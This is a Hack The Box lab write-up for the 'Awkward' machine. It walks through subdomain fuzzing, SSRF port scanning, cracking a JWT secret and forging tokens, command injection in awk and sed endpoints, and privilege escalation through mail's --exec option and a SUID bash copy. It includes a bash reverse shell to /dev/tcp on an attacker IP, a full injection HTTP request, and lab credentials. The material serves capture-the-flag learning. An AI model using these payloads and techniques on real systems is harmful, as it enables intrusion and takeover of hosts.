## Awkward

https://app.hackthebox.com/machines/503

### User Flag

Open 10.10.11.185:22  
Open 10.10.11.185:80  

Express/Node.js

http://hat-valley.htb/

```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://hat-valley.htb' -H "Host: FUZZ.hat-valley.htb" --hw 13

000000081:   401        7 L      12 W       188 Ch      "store"
```

Authorization Required to access store.hat-valley.htb.

On http://hat-valley.htb/js/app.js, line 1 shows that *webpack* is used. We can debug it as [this article](https://blog.jakoblind.no/debug-webpack-app-browser/?source=post_page-----a2664d7e05bb--------------------------------) shows.

It explain that we can find interesting files on Developer Tools --> Sources  --> webpack://. There we can enumerate the following routes in src/services/*
```
- /api/leave
- /api/login
- /api/staff-details
- /api/store-status
```

And these ones in /src/router/router.js
```
- /
- /hr
- /dashboard
- /leave
```

Dashboard and leave requeires "requiresAuth" set to true.  
"hr" shows a login page.

"/api/staff-details" give us credentials.
```
[{"user_id":1,"username":"christine.wool","password":"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649","fullname":"Christine Wool","role":"Founder, CEO","phone":"0415202922"},{"user_id":2,"username":"christopher.jones","password":"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1","fullname":"Christopher Jones","role":"Salesperson","phone":"0456980001"},{"user_id":3,"username":"jackson.lightheart","password":"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436","fullname":"Jackson Lightheart","role":"Salesperson","phone":"0419444111"},{"user_id":4,"username":"bean.hill","password":"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f","fullname":"Bean Hill","role":"System Administrator","phone":"0432339177"}]
```

We can crack one hash and login as christopher.
```
e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1 - chris123
```

#### SSRF
Looking at requests, we see that there is a /api/store-status call.
```
/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb%22
```

We can perform SSRF here trying to access 127.0.0.1:8080. We find this port by checking the console on main website.

Enumerate ports automating this process with python on exploit.py and find port 3002. There is the API documentation.

IppSec automated with ffuf:
```
ffuf -u http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1:FUZZ%22 -w <( seq 1 65535) -mc all -fs 0
```

#### LFI
`/api/submit-leave` seems promising since it uses 'exec'.
```javascript
app.post('/api/submit-leave', (req, res) => {
  const {reason, start, end} = req.body
  const user_token = req.cookies.token
  var authFailed = false
  var user = null

  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)

    if(!decodedToken.username) {
      authFailed = true
    }

    else {
      user = decodedToken.username
    }
  }

  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }

  if(!user) {
    return res.status(500).send("Invalid user")
  }

  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]

  const badInUser = bad.some(char => user.includes(char));

  const badInReason = bad.some(char => reason.includes(char));

  const badInStart = bad.some(char => start.includes(char));

  const badInEnd = bad.some(char => end.includes(char));

  if(badInUser || badInReason || badInStart || badInEnd) {
    return res.status(500).send("Bad character detected.")
  }

  const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"

  exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr) => {

    if (error) {
      return res.status(500).send("Failed to add leave request")
    }

    return res.status(200).send("Successfully added new leave request")

  })

})
```

Everything seems blacklisted, so we continue to another endpoint. `/api/all-leave` that also has `exec`.
```js
app.get('/api/all-leave', (req, res) => {  
  const user_token = req.cookies.token  
  var authFailed = false  
  var user = null  
  if(user_token) {  
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)  
    if(!decodedToken.username) {  
      authFailed = true  
    }  
    else {  
      user = decodedToken.username  
    }  
  }  
  if(authFailed) {  
    return res.status(401).json({Error: "Invalid Token"})  
  }  
  if(!user) {  
    return res.status(500).send("Invalid user")  
  }  
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]  
  
  const badInUser = bad.some(char => user.includes(char));  
  
  if(badInUser) {  
    return res.status(500).send("Bad character detected.")  
  }  
  
  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {  
    if(stdout) {  
      return res.status(200).send(new Buffer(stdout, 'binary'));  
    }  
    if (error) {  
      return res.status(500).send("Failed to retrieve leave requests")  
    }  
    if (stderr) {  
      return res.status(500).send("Failed to retrieve leave requests")  
    }  
  })  
})
```

User is decoded in the JWT Token, so we can insert something like `/' /etc/passwd '/` to perform LFI.
```js
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv")
```

To forge a JWT token we need to discover the secret key.
```
jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4OTc4NDM5fQ.KcQnN6wQtj2csiY-Rvj8sU8MnkZ6CLR1U3nl2o_NOR8 > jwt.john

john jwt.john -wordlist:/usr/share/wordlists/rockyou.txt
```

Got the secret key: 123beany123.

Create a python script to generate the JWT.
```python
import requests
import jwt
import sys

secret = '123beany123'
username = f"/' {sys.argv[1]} '/"
jwt_token = jwt.encode({'username': username, "iat": 1678978439}, secret, algorithm='HS256')
cookie = {'token': jwt_token}

r = requests.get('http://hat-valley.htb/api/all-leave', cookies=cookie, proxies=proxies)

print(r.content)
```

We find a backup file inside `/home/bean/.bashrc`.
```
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Reading bacup_home.sh
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Extract the tar file.
```
# Change the script to save the content to a file instead of print it
python3 exploit.py bean_backup_final.tar.gz

tar -xjvf bean_backup_final.tar.gz .

tar -xjvf bean_backup.tar.gz .
```

Find credentials inside `.config/xpad/content-DS1ZS1` and log in SSH.
`bean.hill:014mrbeanrules!#P`

<br>

### Privilege Escalation

List processes with:
```
ps -ef --forest
```

These are interesting:
```bash
/bin/bash /root/scripts/notify.sh
inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv
```

But we need access to www-data to access leave_requests.csv

We can log into store.hat-valley.htb with `admin:014mrbeanrules!#P`

On /var/www/store/cart_actions.php the live above vulnerable to command injection in a similar way as before.
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {

	...
	system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
	...
```

Command injection request:
```
POST /cart_actions.php HTTP/1.1
Host: store.hat-valley.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://store.hat-valley.htb
Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A=
Connection: close
Referer: http://store.hat-valley.htb/cart.php

item=1/'+-e+"1e+/dev/shm/shell.sh"+'&user=0559-c1cd-524-cfcf&action=delete_item
```

Remember to put the reverse shell inside /dev/shm/shell.sh.
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/1337 0>&1
```

Now with www-data shell, we run pspy to monitor root process and trigger the file.
```
./pspy64

echo 'test' >> /var/www/private/leave_requests.csv
```

We got this on pspy:
```
mail -s Leave Request: test christine
```

Checking GTFOBins, mail can execute commands with `--exec='!/bin/sh'

So we can put a reverse shell on the file and get it.
```
echo \" --exec=\'\!/dev/shm/shell.sh\' >> /var/www/private/leave_requests.csv

# Or directly edit the file
" --exec='!/dev/shm/shell.sh'
```

For some reason pspy doesn't show some quotes, so we need to start with ". The original command is `mail -s "Leave Request: "$name christine`

<br>

#### Extra
You suppose to get root by creating a new product in the machine with command injection inside it and doing a request with it.

Creating a script to be called that set SUID on bash binary.
```
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > /dev/shm/0xdf.sh

chmod +x /dev/shm/0xdf.sh

cat /dev/shm/0xdf.sh

#!/bin/bash
cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
```

Creating product inside /var/www/store/product-details.
```
echo '0xdf --exec="!/dev/shm/0xdf.sh"' >> 223.txt
```

Calling it.
```
item=223&user=0559-c1cd-524-cfcf&action=add_item

/tmp/0xdf -p
```
